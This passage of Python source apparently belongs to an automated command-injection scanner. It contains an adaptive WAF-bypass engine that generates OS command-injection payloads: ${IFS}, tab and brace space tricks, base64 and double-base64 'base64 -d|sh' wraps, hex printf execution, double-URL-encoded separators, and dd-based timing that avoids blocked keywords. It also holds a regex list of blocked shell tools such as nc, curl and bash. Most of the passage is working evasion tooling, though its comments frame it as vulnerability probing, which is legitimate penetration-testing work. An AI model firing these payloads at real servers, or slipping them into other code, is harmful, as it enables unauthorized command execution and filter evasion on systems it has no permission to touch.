        b64_hint  = AdaptiveBypass._FILTER_HINTS["base64"].search(body_bad)
        b64_app   = AdaptiveBypass._APP_DECODE_ERRORS["base64"].search(body_bad)
        if b64_hint or b64_app or err_class == "app_decode_error":
            return "base64"
    except Exception:
        pass

    # ── Test 2: valid base64 of a known marker — does it appear decoded? ──
    marker    = "hh_enc_probe"
    marker_b64 = _b64.b64encode(marker.encode()).decode()
    injected_b64 = {**endpoint["params"], param: marker_b64}
    try:
        if endpoint["method"] == "GET":
            resp_b64 = client.get(endpoint["url"], injected_b64)
        else:
            resp_b64 = client.post(endpoint["url"],
                                   {**endpoint.get("hidden", {}), **injected_b64})
        body_b64 = resp_b64.get("body", "")
        # If the raw marker appears in the response but NOT the b64 form —
        # the server decoded it before using/reflecting it
        if marker in body_b64 and marker_b64 not in body_b64:
            return "base64"
    except Exception:
        pass

    # ── Test 3: invalid JSON → JSON pre-processing? ───────────────────────
    bad_json = "{INVALID_JSON!!!"
    injected_json = {**endpoint["params"], param: bad_json}
    try:
        if endpoint["method"] == "GET":
            resp_json = client.get(endpoint["url"], injected_json)
        else:
            resp_json = client.post(endpoint["url"],
                                    {**endpoint.get("hidden", {}), **injected_json})
        body_json = resp_json.get("body", "")
        json_hint = AdaptiveBypass._APP_DECODE_ERRORS["json"].search(body_json)
        if json_hint:
            return "json"
    except Exception:
        pass

    # ── Test 4: double URL-encoded value — does the server decode twice? ──
    marker_url2 = urllib.parse.quote(urllib.parse.quote(marker, safe=""), safe="")
    injected_url2 = {**endpoint["params"], param: marker_url2}
    try:
        if endpoint["method"] == "GET":
            resp_url2 = client.get(endpoint["url"], injected_url2)
        else:
            resp_url2 = client.post(endpoint["url"],
                                    {**endpoint.get("hidden", {}), **injected_url2})
        body_url2 = resp_url2.get("body", "")
        # If decoded marker appears and double-encoded form does not
        if marker in body_url2 and marker_url2 not in body_url2:
            return "url"
    except Exception:
        pass

    return "none"


# ─────────────────────────────────────────────────────────────────────────────
# WAF CONTEXT — blocked command keywords and dd-based bypass
#
# Many WAFs blacklist common shell commands by keyword (cat, sleep, ping,
# whoami, bash, etc.) but miss less-common utilities like dd.
#
# dd bypass strategy (time-based, no sleep, no blocked keywords):
#   dd<TAB>if=/dev/zero<TAB>bs=1M<TAB>count=10
#   → reads 10 MB from /dev/zero, creates ~0.5–1 s I/O delay per MB
#   → use count=50–100 for a noticeable delay (varies by hardware)
#   → raw tab character (\t) is used instead of space (bypasses " " check)
#   → hex escapes (\x09) are NOT used — some WAFs block \x.. sequences
#
# The dd payloads are added to Tier 5 WAF-context sub-tier (5H).
# They are only activated when the 'waf' filter is detected OR all other
# timed payloads fail.
# ─────────────────────────────────────────────────────────────────────────────
_WAF_BLOCKED_CMDS = re.compile(
    r"\b(?:sleep|ping|wget|curl|nc|ncat|netcat|bash|sh|zsh|ksh|csh|"
    r"cat|tac|head|tail|less|more|whoami|id|uname|hostname|ifconfig|"
    r"ip\s+addr|ps|top|ls|dir|find|locate|which|env|set|export|"
    r"python|perl|ruby|php|node|java|gcc|make|awk|sed|grep|"
    r"nmap|masscan|sqlmap|msfconsole)\b",
    re.I
)

def _dd_delay_cmd(count: int = 50, tab: str = "\t") -> str:
    """
    Build a dd-based time-delay command that avoids all blocked keywords.
    Uses raw tab as argument separator (bypasses ' '-in-string checks).
    count=50 → reads 50 MB from /dev/zero → ~0.5-2 s delay.
    count=200 → ~2-8 s delay (better for high-latency targets).
    """
    return f"dd{tab}if=/dev/zero{tab}bs=1M{tab}count={count}"

def _dd_delay_b64(count: int = 50) -> str:
    """
    Base64-encode the dd command for whole-value or B64-wrap use.
    Example: b64("dd\tif=/dev/zero\tbs=1M\tcount=50")
    """
    import base64 as _b
    return _b.b64encode(_dd_delay_cmd(count).encode()).decode()


#
# Sub-engines (run in order, stop as soon as injection confirmed):
#   5A) Space-bypass variants   — ${IFS}, tab, brace — always run first
#   5B) Whole-value B64 encode  — encode the ENTIRE param value as base64,
#                                  server decodes and passes to shell
#   5C) Command B64-wrap        — echo <b64>|base64 -d|sh inside the payload
#   5D) Double-B64              — base64 of base64 for extra WAF evasion
#   5E) Hex encoding            — printf '\x73\x6c...'|sh
#   5F) URL + B64 combos        — %2b encoded separators around b64 payload
#   5G) Double-URL encoding     — %25xx sequences
#
# Timing engine:
#   - Collects 3-5 baseline samples BEFORE any timed payload
#   - Statistical baseline = median of samples
#   - Sends timed payload, confirms with sleep-0 differential control
#   - Flags only when: elapsed > baseline*2 + threshold AND ratio >= 2.5x
#
# The classifier is also used by Verifier to eliminate false positives.
# ─────────────────────────────────────────────────────────────────────────────
import base64 as _base64_module

class AdaptiveBypass:
    """
    Full adaptive bypass engine.
    Only invoked as Tier 5 — after direct, time, redirect, and OOB all miss.

    Sub-tier ordering (stops at first confirmed hit per param):
      5A  Space-bypass  (IFS / tab / brace) — fastest, no encoding overhead
      5B  Whole-value Base64 encoding        — entire value = b64(payload)
      5C  Command Base64 wrap               — sep + echo b64|base64 -d|sh
      5D  Double-Base64                     — b64(b64(cmd))
      5E  Hex printf                        — printf '\\xHH...'|sh
      5F  URL+Base64 combos                — %2b / %0a around b64 payload
      5G  Double-URL encoding              — %25xx separators
    """

    # ── Timing constants ──────────────────────────────────────────────────────
    BASELINE_SAMPLES  = 4      # number of baseline requests collected
    TIMING_RATIO_MIN  = 2.5    # sleep_payload / sleep_0 must be >= this
    TIMING_JITTER_PAD = 1.5    # extra seconds added to median baseline

    # ── Error classification patterns ─────────────────────────────────────────
    _TYPE_ERROR_PATTERNS = [
        re.compile(r"valueerror.*invalid literal for int", re.I),
        re.compile(r"valueerror.*could not convert", re.I),
        re.compile(r"typeerror.*int\(\)", re.I),
        re.compile(r"typeerror.*argument.*must be.*str.*int", re.I),
        re.compile(r"traceback.*most recent call last", re.I | re.S),
        re.compile(r'file "[^"]+", line \d+', re.I),
        re.compile(r"invalid value for integer", re.I),
        re.compile(r"no implicit conversion of", re.I),
        re.compile(r"\bnan\b.*is not a number|parsefloat|parseint.*nan", re.I),
        re.compile(r"typeerror:.*is not a function", re.I),
        re.compile(r"numberformatexception", re.I),
        re.compile(r"java\.lang\.(number|illegal|class).*exception", re.I),
        re.compile(r"php (?:parse|fatal|notice).*error", re.I),
        re.compile(r"at (?:[A-Za-z0-9_.]+)\((?:[A-Za-z0-9_.]+):\d+\)", re.I),
    ]

    _SQL_PATTERNS = re.compile(
        r"syntax error|you have an error in your sql|ora-\d{5}"
        r"|pg_query|sqlite.*error|unclosed quotation|odbc.*driver"
        r"|microsoft ole db|division by zero|conversion failed", re.I
    )

    # ── Application-level decode error patterns ───────────────────────────
    # These distinguish app-level validation failures from WAF blocks.
    # WAF: generic block/deny page, no decode-specific message.
    # App decode: specific error about malformed encoding format.
    _APP_DECODE_ERRORS = {
        "base64": re.compile(
            r"invalid\s+base64|base64\s+decode\s+error|illegal\s+base64"
            r"|not\s+(?:valid|a\s+valid)\s+base64|base64.*padding"
            r"|binascii\.error|incorrect\s+padding|base64\s+encoded"
            r"|forgiving.*decode|urlsafe.*decode.*fail"
            r"|base64url.*invalid|base64_decode.*failed",
            re.I
        ),
        "json": re.compile(
            r"json\s+(?:parse|decode|syntax)\s+error|invalid\s+json"
            r"|jsondecodeerror|unexpected\s+token.*json|json.*malformed"
            r"|syntaxerror.*json|json\.parse.*fail|expecting\s+value.*json",
            re.I
        ),
        "url": re.compile(
            r"url\s+decode\s+error|invalid\s+(?:url|percent)\s+encoding"
            r"|malformed\s+url|percent.*decode.*fail|urldecoder.*exception",
            re.I
        ),
        "xml": re.compile(
            r"xml\s+parse\s+error|xmlparseexception|malformed\s+xml"
            r"|well-formed.*xml|sax.*exception",
            re.I
        ),
    }

    # ── Filter detection ──────────────────────────────────────────────────────
    _FILTER_HINTS = {
        "double_url":   re.compile(r"malformed|illegal\s+char|invalid\s+percent|decode\s+error", re.I),
        "base64":       re.compile(r"base64|must be encoded|invalid\s+encoding|not\s+valid\s+base64", re.I),
        "no_semicolon": re.compile(r"semicolon|illegal\s+character|not allowed.*[;|]|contains.*[;|]", re.I),
        "no_space":     re.compile(r"space not allowed|no spaces|whitespace.*not|invalid.*whitespace", re.I),
        "hex":          re.compile(r"\bhex\b|hexadecimal|0x[0-9a-f]+", re.I),
        "waf":          re.compile(
            r"blocked|security\s+violation|waf|firewall|threat\s+detected"
            r"|attack\s+detected|mod_security|access denied by rule", re.I
        ),
        # Execution confirmation signals — server processed the command even without output
        "exec_confirm": re.compile(
            r"command\s+(?:executed|processed|completed|finished|accepted|queued|running|success)"
            r"|execution\s+(?:success|complete|started|triggered|ok)"
            r"|job\s+(?:queued|submitted|started|complete|done)"
            r"|task\s+(?:queued|submitted|started|running|complete|done)"
            r"|process\s+(?:started|launched|spawned|ok)"
            r"|ok\b.*(?:executed|processed)|status.*ok.*cmd"
            r"|\"success\"\s*:\s*true|\"status\"\s*:\s*\"ok\""
            r"|\"result\"\s*:\s*\"success\"|\"code\"\s*:\s*0"
            r"|command\s+executed\s+successfully|output\s+suppressed"
            r"|ran\s+successfully|finished\s+with\s+exit\s+code\s+0",
            re.I
        ),
    }

    # ── Application success indicators ───────────────────────────────────────────────────────
    # Positive success signals in HTML/JSON body that confirm execution even when
    # no command output is reflected.  Scanned explicitly by _scan_success_indicators()
    # so results carry a confidence level and are not confused with FP 200 OK.
    _SUCCESS_INDICATORS = [
        # High-confidence: explicit execution messages
        (re.compile(r"command\s+executed\s+successfully", re.I), "high"),
        (re.compile(r"execution\s+(?:was\s+)?successful", re.I), "high"),
        (re.compile(r"ran\s+successfully|finished\s+successfully", re.I), "high"),
        (re.compile(r"exit\s+code[:\s]+0\b", re.I), "high"),
        (re.compile(r"return\s+code[:\s]+0\b", re.I), "high"),
        (re.compile(r"\bstdout\b.*\bstderr\b|\bstderr\b.*\bstdout\b", re.I), "high"),
        # High-confidence: structured success JSON fields
        (re.compile(r'{"status"\s*:\s*"ok"}', re.I), "high"),
        (re.compile(r'{"result"\s*:\s*"success"}', re.I), "high"),
        (re.compile(r'"executed"\s*:\s*true', re.I), "high"),
        (re.compile(r'"code"\s*:\s*0[,}]', re.I), "medium"),
        # Medium-confidence: operational completion signals
        (re.compile(r"operation\s+(?:completed|succeeded|done)", re.I), "medium"),
        (re.compile(r"request\s+(?:processed|accepted|completed)", re.I), "medium"),
        (re.compile(r"output:\s*<br|output:\s*\n|<pre[^>]*>.*?</pre>", re.I | re.S), "medium"),
    ]

    @classmethod
    def _scan_success_indicators(cls, body: str, baseline_body: str) -> tuple:
        """
        Scan response body for application-level success indicators.
        Returns (found: bool, confidence: str, matched_text: str).

        Only reports True when the indicator is present in the payload response
        but NOT in the baseline, preventing false positives from static pages.

        FIX 5 (CyArt benchmark): Medium-confidence indicators are extremely
        common on normal app responses ("request processed", <pre> blocks, etc.)
        and cause blind false positives. Only HIGH confidence indicators trigger
        auto-confirm. Medium indicators are returned with found=False so they
        are logged by the caller but never recorded as findings autonomously.
        This aligns with Agent 13 spec: "must be very careful in probing" and
        "logging suspected vulnerabilities with detailed evidence" — medium hits
        are not evidence, they are hints for human review.
        """
        for pat, confidence in cls._SUCCESS_INDICATORS:
            m = pat.search(body)
            if m and not pat.search(baseline_body):
                snippet = m.group().strip()[:80]
                if confidence == "high":
                    return True, confidence, snippet
                else:
                    # Medium: log-only, never auto-confirm (FP rate too high)
                    vdim(f"  [success-indicator] medium confidence match (log only): {snippet[:60]}")
                    return False, confidence, snippet
        return False, "", ""

    # ─────────────────────────────────────────────────────────────────────────
    # Error classification (used by Verifier too)
    # ─────────────────────────────────────────────────────────────────────────
    @classmethod
    def classify_error(cls, body: str) -> str:
        """
        Returns one of:
          'type_conversion'   -- param expected int/float, not injectable
          'app_decode_error'  -- app tried to decode (b64/json/url/xml) and failed
          'input_validation'  -- app rejected value on business-rule grounds:
                                 spaces/semicolons/pipes not allowed, bad chars, etc.
                                 Agent uses this to automatically switch bypass technique.
          'exec_error'        -- command ran but produced OS/shell error output.
                                 Confirms injection even though the command failed.
          'sql'               -- SQL error leaked (SQLi context)
          'php_warning'       -- PHP warning/notice/fatal
          'app_crash'         -- generic traceback/exception
          'waf_block'         -- generic network/CDN deny (no app-level context)
          'access_denied'     -- auth/permissions gate
          'none'              -- no error pattern matched

        Ordering: app_decode_error > input_validation > exec_error > waf_block.
        Specific signals are preferred over generic ones so the agent adapts
        the correct bypass (e.g. IFS on input_validation/no_space rather than
        switching encoding on waf_block).
        """
        sample = body[:3000]

        # Type-conversion first -- guarantees no shell path
        for pat in cls._TYPE_ERROR_PATTERNS:
            if pat.search(sample):
                return "type_conversion"

        # App-level decode errors -- BEFORE validation/WAF checks
        for enc_type, pat in cls._APP_DECODE_ERRORS.items():
            if pat.search(sample):
                return "app_decode_error"

        # Input validation -- app rejected value on content/format rules.
        # Tells us WHAT to change (e.g. remove spaces, remove semicolons).
        if re.search(
            r"space(?:s)?\s+(?:not\s+)?(?:allowed|permitted|supported)"
            r"|no\s+spaces?\s+allowed"
            r"|whitespace\s+(?:not\s+allowed|forbidden|invalid)"
            r"|invalid\s+whitespace"
            r"|semicolon(?:s)?\s+(?:not\s+)?(?:allowed|permitted)"
            r"|pipe(?:s)?\s+(?:not\s+)?(?:allowed|permitted)"
            r"|special\s+char(?:acter)?s?\s+(?:not\s+)?(?:allowed|permitted|forbidden)"
            r"|invalid\s+char(?:acter)?s?\s+in"
            r"|illegal\s+char(?:acter)?"
            r"|character(?:s)?\s+not\s+allowed"
            r"|input\s+(?:contains\s+)?(?:invalid|forbidden|illegal)\s+"
            r"|value\s+too\s+long|exceeds\s+maximum\s+length"
            r"|must\s+not\s+contain|must\s+only\s+contain",
            sample, re.I
        ):
            return "input_validation"

        # Execution errors -- command ran but OS/shell reported an error.
        # This CONFIRMS the injection worked (output is evidence of execution).
        if re.search(
            r"command\s+not\s+found"
            r"|no\s+such\s+file\s+or\s+directory"
            r"|permission\s+denied"
            r"|operation\s+not\s+permitted"
            r"|sh:\s+\d+:"
            r"|bash:\s+\w+:\s+(?:command\s+not\s+found|not\s+found)"
            r"|/bin/sh:\s"
            r"|\bexec:\s+[^\s]+:\s+(?:not\s+found|no\s+such)",
            sample, re.I
        ):
            return "exec_error"

        if cls._SQL_PATTERNS.search(sample.lower()):
            return "sql"
        if re.search(r"warning:\s*[a-z_]+\(|notice:\s*undefined|fatal error:|parse error:", sample, re.I):
            return "php_warning"
        if re.search(r"traceback|exception|stack trace|unhandled", sample, re.I):
            return "app_crash"
        # WAF block -- generic deny, no application-level context
        if re.search(r"blocked|security violation|waf|firewall|mod_security|threat detected", sample, re.I):
            return "waf_block"
        if re.search(r"access denied|unauthorized|forbidden|must be logged", sample, re.I):
            return "access_denied"
        return "none"
    @classmethod
    def detect_filters(cls, body: str) -> set:
        """Parse error body and return set of active filter labels."""
        detected = set()
        for lbl, pat in cls._FILTER_HINTS.items():
            if pat.search(body):
                detected.add(lbl)
        return detected

    # ─────────────────────────────────────────────────────────────────────────
    # Encoding primitives
    # ─────────────────────────────────────────────────────────────────────────
    @staticmethod
    def _ifs(s: str) -> str:
        """Replace all spaces with ${IFS}."""
        return s.replace(" ", "${IFS}")

    @staticmethod
    def _tab(s: str) -> str:
        """Replace all spaces with literal tab."""
        return s.replace(" ", "\t")

    @staticmethod
    def _b64(data: str) -> str:
        """Base64-encode a string, return the encoded string (no newlines)."""
        return _base64_module.b64encode(data.encode()).decode()

    @staticmethod
    def _b64_wrap(cmd: str) -> str:
        """
        Wrap a shell command as:  echo <b64>|base64 -d|sh
        The command is base64-encoded; the shell decodes and executes it.
        Example: _b64_wrap("sleep 10") → "echo c2xlZXAgMTA=|base64 -d|sh"
        """
        return f"echo {AdaptiveBypass._b64(cmd.strip())}|base64 -d|sh"

    @staticmethod
    def _b64_wrap2(cmd: str) -> str:
        """
        Double-Base64 wrap:  echo <b64(b64(cmd))>|base64 -d|base64 -d|sh
        Example: sleep 10  →  echo <b64(b64("sleep 10"))>|base64 -d|base64 -d|sh
        """
        inner = AdaptiveBypass._b64(cmd.strip())
        outer = AdaptiveBypass._b64(inner)
        return f"echo {outer}|base64 -d|base64 -d|sh"

    @staticmethod
    def _hex_wrap(cmd: str) -> str:
        """
        Hex-encode every byte of cmd and execute via printf.
        Example: id → printf '\\x69\\x64'|sh
        """
        hexstr = cmd.strip().encode().hex()
        pairs  = "".join(f"\\x{hexstr[i:i+2]}" for i in range(0, len(hexstr), 2))
        return f"printf '{pairs}'|sh"

    @staticmethod
    def _url_enc(s: str, double: bool = False) -> str:
        enc = urllib.parse.quote(s, safe="")
        if double:
            enc = urllib.parse.quote(enc, safe="")
        return enc

    # ─────────────────────────────────────────────────────────────────────────
    # Statistical timing baseline
    # ─────────────────────────────────────────────────────────────────────────
    @staticmethod
    def measure_baseline(client, endpoint: dict, param: str,
                         samples: int = None) -> float:
        """
        Collect N baseline response times for the endpoint with clean value.
        Returns the median elapsed time.  Used before any timed payload.
        """
        n = samples or AdaptiveBypass.BASELINE_SAMPLES
        times = []
        base_val = endpoint["params"].get(param, "test")
        params   = {**endpoint["params"], param: base_val}
        for _ in range(n):
            t0 = time.time()
            try:
                if endpoint["method"] == "GET":
                    client.get(endpoint["url"], params)
                else:
                    client.post(endpoint["url"],
                                {**endpoint.get("hidden", {}), **params})
            except Exception:
                pass
            times.append(time.time() - t0)
        times.sort()
        return times[len(times) // 2]   # median

    # ─────────────────────────────────────────────────────────────────────────
    # Whole-value Base64 encoding helpers
    #
    # Some apps decode the entire parameter value before passing it to a shell:
    #   decoded = base64.b64decode(request.args["cmd"])
    #   os.system(decoded)
    #
    # Strategy: encode the full injection string as base64 and send that as
    # the parameter value.  No separator prefix — value IS the payload.
    #
    # For time-based detection we also send a sleep-0 control and compare.
    # ─────────────────────────────────────────────────────────────────────────
    @classmethod
    def whole_value_b64_payloads(cls, token: str) -> list:
        """
        Returns list of (payload_value, template, desc, verify_type, is_time, os_type)
        where payload_value is the *entire* parameter value (b64-encoded shell cmd).

        The payloads are marked with a special prefix "WV:" so _send() knows to
        use replace-mode (not append to base value).
        """
        results = []
        seen = set()

        def add(pl, tmpl, desc, vtype, is_t, os_t):
            if pl not in seen:
                seen.add(pl)
                results.append((pl, tmpl, desc, vtype, is_t, os_t))

        # ── Single Base64 ─────────────────────────────────────────────────
        # Payloads that the server decodes then passes to os.system() / eval

        # Direct output: id, whoami, echo TOKEN
        add(cls._b64("id"),
            "WV:b64(id)",
            "Whole-val B64: id",
            "system:linux_id", False, "linux")

        add(cls._b64("whoami"),
            "WV:b64(whoami)",
            "Whole-val B64: whoami",
            "system:linux_user", False, "linux")

        add(cls._b64(f"echo {token}"),
            f"WV:b64(echo TOKEN)",
            "Whole-val B64: echo TOKEN",
            "echo", False, "linux")

        # Time-based: sleep 10  (space preserved — b64 doesn't care)
        add(cls._b64("sleep 10"),
            "WV:b64(sleep 10)",
            "Whole-val B64: sleep 10",
            "time", True, "linux")

        # With IFS space bypass inside b64  (in case server strips spaces before decode)
        add(cls._b64("sleep${IFS}10"),
            "WV:b64(sleep${IFS}10)",
            "Whole-val B64: sleep IFS 10",
            "time", True, "linux")

        # ── Double Base64 ────────────────────────────────────────────────
        # b64(b64(cmd)) — for servers that double-decode, or for WAF evasion

        add(cls._b64(cls._b64("id")),
            "WV:b64(b64(id))",
            "Whole-val DblB64: id",
            "system:linux_id", False, "linux")

        add(cls._b64(cls._b64("whoami")),
            "WV:b64(b64(whoami))",
            "Whole-val DblB64: whoami",
            "system:linux_user", False, "linux")

        add(cls._b64(cls._b64(f"echo {token}")),
            "WV:b64(b64(echo TOKEN))",
            "Whole-val DblB64: echo TOKEN",
            "echo", False, "linux")

        add(cls._b64(cls._b64("sleep 10")),
            "WV:b64(b64(sleep 10))",
            "Whole-val DblB64: sleep 10",
            "time", True, "linux")

        # ── URL + Base64 combos ──────────────────────────────────────────
        # Some decoders expect the b64 to be URL-encoded on top

        b64_sleep = cls._b64("sleep 10")
        b64_id    = cls._b64("id")
        b64_who   = cls._b64("whoami")

        add(cls._url_enc(b64_sleep),
            "WV:urlenc(b64(sleep 10))",
            "Whole-val URL+B64: sleep",
            "time", True, "linux")

        add(cls._url_enc(b64_id),
            "WV:urlenc(b64(id))",
            "Whole-val URL+B64: id",
            "system:linux_id", False, "linux")

        add(cls._url_enc(b64_who),
            "WV:urlenc(b64(whoami))",
            "Whole-val URL+B64: whoami",
            "system:linux_user", False, "linux")

        # Double URL-encode + B64
        add(cls._url_enc(b64_sleep, double=True),
            "WV:dblurl(b64(sleep 10))",
            "Whole-val DblURL+B64: sleep",
            "time", True, "linux")

        return results

    @classmethod
    def whole_value_b64_sleep0_payload(cls) -> str:
        """Return the whole-value b64 of 'sleep 0' for differential control."""
        return cls._b64("sleep 0")

    @classmethod
    def dd_ctrl_b64(cls) -> str:
        """
        Return whole-value b64 of a near-instant dd command (count=1).
        Used as sleep-0 equivalent control for dd-based timing tests.
        dd\tif=/dev/zero\tbs=1\tcount=1  → reads 1 byte, ~instant.
        """
        return _dd_delay_b64(1)   # count=1 → reads 1 byte, negligible I/O

    # ─────────────────────────────────────────────────────────────────────────
    # Full adaptive payload set  (5A–5G sub-tiers)
    # ─────────────────────────────────────────────────────────────────────────
    @classmethod
    def generate_bypass_payloads(cls, token: str, os_target: str,
                                 filters: set) -> list:
        """
        Generate complete Tier 5 adaptive payload list.
        Returns list of (payload, template, desc, verify_type, is_time, os_type).

        Ordering: space-bypass first (fast), then encoding tiers.
        Whole-value B64 payloads are included and marked with "WV:" template prefix
        so _send() uses replace-mode.
        """
        results = []
        seen    = set()

        def add(pl, tmpl, desc, vtype, is_t, os_t):
            if pl not in seen:
                seen.add(pl)
                results.append((pl, tmpl, desc, vtype, is_t, os_t))

        tok = token

        # ─── 5A: Space bypass ────────────────────────────────────────────
        # IFS variants
        add(f";echo${{{' '}IFS}}{tok}",  f";echo${{IFS}}TOKEN",  "5A IFS echo",       "echo",             False, "linux")
        add(f"|echo${{{' '}IFS}}{tok}",  f"|echo${{IFS}}TOKEN",  "5A IFS pipe echo",  "echo",             False, "linux")
        add(";sleep${IFS}10",             ";sleep${IFS}10",       "5A IFS sleep",      "time",             True,  "linux")
        add(";id",                        ";id",                  "5A IFS id",         "system:linux_id",  False, "linux")
        add(";whoami",                    ";whoami",              "5A IFS whoami",     "system:linux_user",False, "linux")

        # Tab variants
        add(f";echo\t{tok}",             f";echo\tTOKEN",        "5A tab echo",       "echo",             False, "linux")
        add(";sleep\t10",                ";sleep\t10",           "5A tab sleep",      "time",             True,  "linux")
        add(f"\necho\t{tok}",            f"\necho\tTOKEN",       "5A NL+tab echo",    "echo",             False, "linux")
        add("\nsleep\t10",               "\nsleep\t10",          "5A NL+tab sleep",   "time",             True,  "linux")

        # Brace expansion  {cmd,}  — no space at all
        add(";{id,}",                    ";{id,}",               "5A brace id",       "system:linux_id",  False, "linux")
        add(";{whoami,}",                ";{whoami,}",           "5A brace whoami",   "system:linux_user",False, "linux")
        add(f";{{echo,{tok}}}",          f";{{echo,TOKEN}}",     "5A brace echo",     "echo",             False, "linux")
        add(";{sleep,10}",               ";{sleep,10}",          "5A brace sleep",    "time",             True,  "linux")

        # Newline separator (no semicolons)
        add(f"\necho {tok}",             f"\necho TOKEN",        "5A NL echo",        "echo",             False, "linux")
        add(f"\necho {tok}\n",           f"\necho TOKEN\n",      "5A NL-wrap echo",   "echo",             False, "linux")
        add("\nid\n",                    "\nid\n",               "5A NL-wrap id",     "system:linux_id",  False, "linux")
        add("\nwhoami\n",                "\nwhoami\n",           "5A NL-wrap whoami", "system:linux_user",False, "linux")
        add("\nsleep 10\n",              "\nsleep 10\n",         "5A NL-wrap sleep",  "time",             True,  "linux")
        add(f"%0aecho%20{tok}",          f"%0aecho%20TOKEN",     "5A URL-NL echo",    "echo",             False, "linux")
        add("%0aid%0a",                  "%0aid%0a",             "5A URL-NL id",      "system:linux_id",  False, "linux")
        add("%0asleep%2010%0a",          "%0asleep%2010%0a",     "5A URL-NL sleep",   "time",             True,  "linux")

        # ─── 5B: Whole-value Base64 (entire param = b64 of shell cmd) ────
        # These are added via whole_value_b64_payloads() and handled in
        # _run_adaptive_tier directly with the statistical timing engine.
        # We include them here too so generate_bypass_payloads() is self-contained.
        for entry in cls.whole_value_b64_payloads(tok):
            add(*entry)

        # ─── 5C: Command Base64 wrap  (sep + echo b64|base64 -d|sh) ─────
        b64_id    = cls._b64_wrap("id")
        b64_who   = cls._b64_wrap("whoami")
        b64_sleep = cls._b64_wrap("sleep 10")
        b64_echo  = cls._b64_wrap(f"echo {tok}")

        for sep in (";", "|", "&&", "||"):
            add(f"{sep}{b64_echo}", f"{sep}{cls._b64_wrap('echo TOKEN')}",
                f"5C B64-wrap echo ({sep})",  "echo",             False, "linux")
            add(f"{sep}{b64_id}",   f"{sep}{cls._b64_wrap('id')}",
                f"5C B64-wrap id ({sep})",    "system:linux_id",  False, "linux")
            add(f"{sep}{b64_who}",  f"{sep}{cls._b64_wrap('whoami')}",
                f"5C B64-wrap who ({sep})",   "system:linux_user",False, "linux")
            add(f"{sep}{b64_sleep}",f"{sep}{cls._b64_wrap('sleep 10')}",
                f"5C B64-wrap sleep ({sep})", "time",             True,  "linux")

        # IFS inside the b64-decoded command (space filter before decode)
        b64_ifs_sleep = cls._b64_wrap("sleep${IFS}10")
        add(f";{b64_ifs_sleep}", f";{cls._b64_wrap('sleep${IFS}10')}",
            "5C B64-wrap IFS sleep", "time", True, "linux")

        # ─── 5D: Double-Base64 wrap ───────────────────────────────────────
        db64_id    = cls._b64_wrap2("id")
        db64_who   = cls._b64_wrap2("whoami")
        db64_sleep = cls._b64_wrap2("sleep 10")
        db64_echo  = cls._b64_wrap2(f"echo {tok}")

        for sep in (";", "|"):
            add(f"{sep}{db64_echo}",f"{sep}{cls._b64_wrap2('echo TOKEN')}",
                f"5D DblB64 echo ({sep})",  "echo",             False, "linux")
            add(f"{sep}{db64_id}",  f"{sep}{cls._b64_wrap2('id')}",
                f"5D DblB64 id ({sep})",    "system:linux_id",  False, "linux")
            add(f"{sep}{db64_who}", f"{sep}{cls._b64_wrap2('whoami')}",
                f"5D DblB64 who ({sep})",   "system:linux_user",False, "linux")
            add(f"{sep}{db64_sleep}",f"{sep}{cls._b64_wrap2('sleep 10')}",
                f"5D DblB64 sleep ({sep})", "time",             True,  "linux")

        # ─── 5E: Hex printf encoding ─────────────────────────────────────
        hex_id    = cls._hex_wrap("id")
        hex_who   = cls._hex_wrap("whoami")
        hex_sleep = cls._hex_wrap("sleep 10")
        hex_echo  = cls._hex_wrap(f"echo {tok}")

        for sep in (";", "|", "&&"):
            add(f"{sep}{hex_id}",   f"{sep}printf_hex(id)",
                f"5E hex id ({sep})",    "system:linux_id",  False, "linux")
            add(f"{sep}{hex_who}",  f"{sep}printf_hex(whoami)",
                f"5E hex whoami ({sep})","system:linux_user",False, "linux")
            add(f"{sep}{hex_sleep}",f"{sep}printf_hex(sleep 10)",
                f"5E hex sleep ({sep})", "time",             True,  "linux")
            add(f"{sep}{hex_echo}", f"{sep}printf_hex(echo TOKEN)",
                f"5E hex echo ({sep})",  "echo",             False, "linux")

        # ─── 5F: URL + Base64 combos (appended to base value) ────────────
        # %0a (URL newline) before b64-wrapped command
        add(f"%0a{b64_sleep}",  f"%0a{cls._b64_wrap('sleep 10')}",
            "5F URL-NL+B64 sleep", "time", True, "linux")
        add(f"%0a{b64_id}",     f"%0a{cls._b64_wrap('id')}",
            "5F URL-NL+B64 id",   "system:linux_id", False, "linux")
        add(f"%0a{b64_echo}",   f"%0a{cls._b64_wrap('echo TOKEN')}",
            "5F URL-NL+B64 echo", "echo", False, "linux")

        # %3b (URL-encoded semicolon) before b64-wrapped command
        add(f"%3b{b64_sleep}",  f"%3b{cls._b64_wrap('sleep 10')}",
            "5F URL-semi+B64 sleep","time", True, "linux")
        add(f"%3b{b64_id}",     f"%3b{cls._b64_wrap('id')}",
            "5F URL-semi+B64 id",  "system:linux_id", False, "linux")
        add(f"%3b{b64_echo}",   f"%3b{cls._b64_wrap('echo TOKEN')}",
            "5F URL-semi+B64 echo","echo", False, "linux")

        # ─── 5G: Double-URL encoding ──────────────────────────────────────
        # %253b = double-encoded semicolon, %2520 = double-encoded space
        add(f"%253bsleep%252010",   "%253bsleep%252010",
            "5G DblURL sleep",  "time",             True,  "linux")
        add("%253bid",              "%253bid",
            "5G DblURL id",     "system:linux_id",  False, "linux")
        add("%253bwhoami",          "%253bwhoami",
            "5G DblURL whoami", "system:linux_user",False, "linux")
        add(f"%253becho%2520{tok}", f"%253becho%2520TOKEN",
            "5G DblURL echo",   "echo",             False, "linux")

        # Double-URL + IFS inside (most evasive)
        add("%253bsleep${IFS}10",   "%253bsleep${IFS}10",
            "5G DblURL+IFS sleep","time",            True,  "linux")

        # ─── 5H: dd-based time-delay (WAF keyword bypass) ────────────────
        #
        # Purpose: bypass WAFs that blacklist sleep/ping/whoami/cat etc.
        # Technique:
        #   • Use "dd" — not blocked by most WAFs
        #   • Separate args with RAW TAB (\t), NOT space and NOT \x09
        #     (the \x09 hex escape itself may be blocked; raw tab is not)
        #   • dd reads from /dev/zero: creates I/O delay without sleep
        #   • count=50  → ~0.5-2 s delay  (low latency targets)
        #   • count=200 → ~2-8 s delay     (high latency / throttled targets)
        #
        # Also adds B64-encoded dd commands (for servers that b64-decode input)
        # and WAF-context location variants (query vs POST body).
        #
        # dd cmd: dd\tif=/dev/zero\tbs=1M\tcount=N
        # b64:    ZGQJaWY9L2Rldi96ZXJvCWJzPTFNCWNvdW50PTUQ==  (count=50)
        # ─────────────────────────────────────────────────────────────────

        TAB = "\t"   # raw horizontal tab — passes " " space filter checks

        # ── 5H-a: Raw tab dd (append-mode) ───────────────────────────────
